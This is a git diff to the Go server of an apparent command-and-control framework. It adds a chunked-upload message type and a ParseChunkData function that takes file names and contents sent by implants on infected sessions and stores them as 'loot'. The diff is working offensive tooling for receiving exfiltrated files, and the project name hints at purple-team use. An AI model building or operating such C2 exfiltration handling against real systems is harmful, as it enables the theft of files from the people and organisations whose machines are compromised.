@@ -13,6 +13,7 @@ import (
 	"purpcmd/internal/encrypt"
 	"purpcmd/server/implant"
 	"purpcmd/server/log"
+	"purpcmd/server/loot"
 	"purpcmd/server/lua"
 )
 
@@ -71,6 +72,8 @@ func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
 		task, err = ParseCheck(r, req)
 	case internal.RSP:
 		err = ParseResponse(r, req)
+	case internal.CHU:
+		ParseChunkData(r, req)
 	default:
 		messageType = internal.NIL
 	}
@@ -102,7 +105,7 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 	data := make([]byte, dataLen)
 	binary.Read(r, binary.BigEndian, &data)
 
-	dataS := bytes.Split(data, implant.SEP)
+	dataS := bytes.Split(data, internal.SEP)
 	if len(dataS) != 3 {
 		return errors.New("data must have 3 entities and have")
 	}
@@ -178,5 +181,32 @@ func ParseResponse(r io.Reader, req *http.Request) error {
 	lua.LuaOnResponse(TaskID, string(respPayload), imp.Metadata,imp.Name, imp.UUID)
 
 	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length:%d\n\n%s\n\n", name, TaskIDStr, respLen, respPayload))
+	return nil
+}
+
+func ParseChunkData(r io.Reader, req *http.Request) error {
+	i := new(impx.ImplantMetadata)
+	ParseMetadata(r, i)
+	name := fmt.Sprintf("%d", i.SessionID)
+	imp := implant.ImplantPtrByName(name)
+	if imp == nil {
+		return errors.New("no session with name")
+	}
+
+	var TaskID [8]byte
+	binary.Read(r, binary.BigEndian, &TaskID)
+
+	var fileNameLen uint32
+	binary.Read(r, binary.BigEndian, &fileNameLen)
+	fileName := make([]byte, fileNameLen)
+	binary.Read(r, binary.BigEndian, &fileName)
+
+	var contentLen uint32
+	binary.Read(r, binary.BigEndian, &contentLen)
+	content := make([]byte, contentLen)
+	binary.Read(r, binary.BigEndian, &content)
+
+	loot.New(name, string(fileName), content).SaveData()
+
 	return nil
 }
